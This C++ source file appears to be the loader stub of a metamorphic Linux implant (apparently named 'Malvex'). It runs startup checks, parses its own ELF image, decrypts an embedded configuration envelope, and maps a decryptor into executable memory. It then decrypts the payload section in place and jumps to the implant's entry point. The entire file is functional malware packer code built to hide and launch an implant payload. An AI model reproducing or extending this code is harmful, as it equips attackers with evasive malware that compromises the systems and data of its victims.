#include "ConfigDecryptor.hpp"
#include "ElfSelfParser.hpp"
#include "StartupChecks.hpp"

#include <ImplantConfig.hpp>
#include <Metamorphic/BootParams.hpp>
#include <Metamorphic/ConfigEnvelope.hpp>
#include <Metamorphic/PackMode.hpp>

#include <sys/mman.h>
#include <unistd.h>

#include <cstring>
#include <vector>

extern "C" int mx_main(int argc, char** argv, const ImplantConfig* cfg);

#if defined(MALVEX_PACKED)
#define MX_STUB_SECTION __attribute__((section(".mx_stub"), used))
#else
#define MX_STUB_SECTION
#endif

MX_STUB_SECTION
alignas(64) uint8_t mx_stub_region[131072] = {0};

#if defined(MALVEX_PACKED)
namespace {

std::size_t page_align(std::size_t size) {
    const auto page_size = static_cast<std::size_t>(sysconf(_SC_PAGESIZE));
    return ((size + page_size - 1) / page_size) * page_size;
}

metamorphic::PayloadDecryptFn map_decryptor(const uint8_t* bytes, std::size_t size) {
    if (size == 0) {
        return nullptr;
    }

    const std::size_t aligned_size = page_align(size);
    void* exec = mmap(nullptr, aligned_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec == MAP_FAILED) {
        return nullptr;
    }

    std::memcpy(exec, bytes, size);

    if (mprotect(exec, aligned_size, PROT_READ | PROT_EXEC) != 0) {
        munmap(exec, aligned_size);
        return nullptr;
    }

    __builtin___clear_cache(static_cast<char*>(exec), static_cast<char*>(exec) + size);
    return reinterpret_cast<metamorphic::PayloadDecryptFn>(exec);
}

void unmap_decryptor(metamorphic::PayloadDecryptFn decrypt_fn, std::size_t size) {
    if (!decrypt_fn || size == 0) {
        return;
    }

    const std::size_t aligned_size = page_align(size);
    munmap(reinterpret_cast<void*>(decrypt_fn), aligned_size);
}

struct PageRange {
    void* start{nullptr};
    std::size_t length{0};
};

PageRange page_range_for(uintptr_t address, std::size_t size) {
    const auto page_size = static_cast<std::size_t>(sysconf(_SC_PAGESIZE));
    const uintptr_t mask = ~(static_cast<uintptr_t>(page_size) - 1U);
    const uintptr_t region_start = address & mask;
    const uintptr_t region_end = (address + size + page_size - 1U) & mask;
    return {reinterpret_cast<void*>(region_start), region_end - region_start};
}

int decrypt_and_run_in_place(
    metamorphic::PayloadDecryptFn decrypt_fn,
    uint8_t* payload,
    std::size_t payload_size,
    std::size_t entry_offset,
    int argc,
    char** argv,
    const ImplantConfig* cfg) {
    const auto pages = page_range_for(reinterpret_cast<uintptr_t>(payload), payload_size);

    if (mprotect(pages.start, pages.length, PROT_READ | PROT_WRITE) != 0) {
        return -1;
    }

    decrypt_fn(payload, payload, payload_size);

    if (mprotect(pages.start, pages.length, PROT_READ | PROT_EXEC) != 0) {
        return -1;
    }

    __builtin___clear_cache(
        reinterpret_cast<char*>(payload),
        reinterpret_cast<char*>(payload) + payload_size);

    using mx_entry_t = int (*)(int, char**, const ImplantConfig*);
    auto entry = reinterpret_cast<mx_entry_t>(payload + entry_offset);
    return entry(argc, argv, cfg);
}

int run_cleartext_payload(
    uint8_t* payload,
    std::size_t payload_size,
    std::size_t entry_offset,
    int argc,
    char** argv,
    const ImplantConfig* cfg) {
    if (entry_offset >= payload_size) {
        return -1;
    }

    using mx_entry_t = int (*)(int, char**, const ImplantConfig*);
    auto entry = reinterpret_cast<mx_entry_t>(payload + entry_offset);
    return entry(argc, argv, cfg);
}

} // namespace
#endif

int main(int argc, char** argv) {
    if (!metamorphic::run_startup_checks()) {
        return 1;
    }

#if !defined(MALVEX_PACKED)
    extern ImplantConfig config;
    return mx_main(argc, argv, &config);
#else
    const auto* boot = reinterpret_cast<const metamorphic::BootParams*>(mx_stub_region);
    if (boot->magic != metamorphic::kBootMagic) {
        extern ImplantConfig config;
        return mx_main(argc, argv, &config);
    }

    ElfSelfParser parser;
    if (!parser.load_from_self()) {
        return 1;
    }

    std::vector<uint8_t> config_section(boot->config_file_size);
    if (!parser.read_file_bytes(boot->config_file_offset, boot->config_file_size, config_section.data())) {
        return 1;
    }

    if (config_section.size() < metamorphic::kConfigPasswordSize + metamorphic::kConfigEnvelopeSize) {
        return 1;
    }

    const auto bytecode = std::span<const uint8_t>(
        mx_stub_region + sizeof(metamorphic::BootParams),
        boot->bytecode_size);

    std::vector<uint8_t> envelope_bytes(
        config_section.begin() + metamorphic::kConfigPasswordSize,
        config_section.end());

    if (!metamorphic::decrypt_buffer(envelope_bytes, bytecode)) {
        return 1;
    }

    if (envelope_bytes.size() < metamorphic::kConfigEnvelopeSize) {
        return 1;
    }

    metamorphic::ConfigEnvelope envelope;
    std::memcpy(&envelope, envelope_bytes.data(), sizeof(envelope));

    const auto payload_section = parser.find_by_name(envelope.payload_section_name);
    if (!payload_section || payload_section->size == 0) {
        return 1;
    }

    auto* payload = reinterpret_cast<uint8_t*>(payload_section->vaddr);
    const auto entry_offset = boot->payload_entry_offset;
    if (entry_offset >= payload_section->size) {
        return 1;
    }

    const auto mode = static_cast<metamorphic::PackMode>(boot->pack_mode);
    if (mode == metamorphic::PackMode::ConfigOnly || mode == metamorphic::PackMode::BytecodePolymorphic) {
        return run_cleartext_payload(
            payload,
            payload_section->size,
            entry_offset,
            argc,
            argv,
            &envelope.implant);
    }

    if (boot->decryptor_size == 0) {
        return 1;
    }

    const auto* decryptor_bytes = mx_stub_region + sizeof(metamorphic::BootParams) + boot->bytecode_size;
    auto* decrypt_fn = map_decryptor(decryptor_bytes, boot->decryptor_size);
    if (!decrypt_fn) {
        return 1;
    }

    const int rc = decrypt_and_run_in_place(
        decrypt_fn,
        payload,
        payload_section->size,
        entry_offset,
        argc,
        argv,
        &envelope.implant);

    unmap_decryptor(decrypt_fn, boot->decryptor_size);
    return rc;
#endif
}
